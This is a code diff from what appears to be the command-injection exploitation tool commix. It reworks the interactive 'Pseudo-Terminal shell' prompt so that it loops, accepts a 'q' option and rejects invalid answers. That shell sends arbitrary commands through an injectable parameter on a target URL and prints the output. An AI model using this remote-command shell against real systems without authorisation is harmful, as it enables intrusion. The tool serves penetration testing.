@@ -291,33 +291,41 @@ def fb_injection_handler(url,delay,filename,http_request_method):
 	  fb_file_access.do_check(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,delay)
 	  
 	  try:
-	    # Pseudo-Terminal shell
-	    gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
-	    if gotshell in settings.CHOISE_YES:
-	      print ""
-	      print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
-	      while True:
-		cmd = raw_input("Shell > ")
-		if cmd == "q":
-		  delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
-		  sys.exit(0)
-		  
-		else:
-		  # The main command injection exploitation.
-		  response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
-		  print ""
-		  # Command execution results.
-		  shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
-		  
-		  if shell:
-		    shell = " ".join(str(p) for p in shell)
-		    print colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"
-	    else:
-	      delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
-	      if menu.options.verbose:
-		sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
-		sys.stdout.flush()
-	      pass
+	    while True:
+	      # Pseudo-Terminal shell
+	      gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n/q] > ").lower()
+	      if gotshell in settings.CHOISE_YES:
+		print ""
+		print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
+		while True:
+		  cmd = raw_input("Shell > ")
+		  if cmd == "q":
+		    delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
+		    sys.exit(0)
+		    
+		  else:
+		    # The main command injection exploitation.
+		    response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
+		    print ""
+		    # Command execution results.
+		    shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
+		    
+		    if shell:
+		      shell = " ".join(str(p) for p in shell)
+		      print colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"
+		    
+	      elif gotshell in settings.CHOISE_NO:
+		delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
+		if menu.options.verbose:
+		  sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
+		  sys.stdout.flush()
+	        break
+	      
+	      else:
+		if gotshell == "":
+		  gotshell = "enter"
+		print colors.BGRED + "(x) Error: '" + gotshell + "' is not a valid answer." + colors.RESET
+		pass
 	    
 	  except KeyboardInterrupt: 
 	    delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
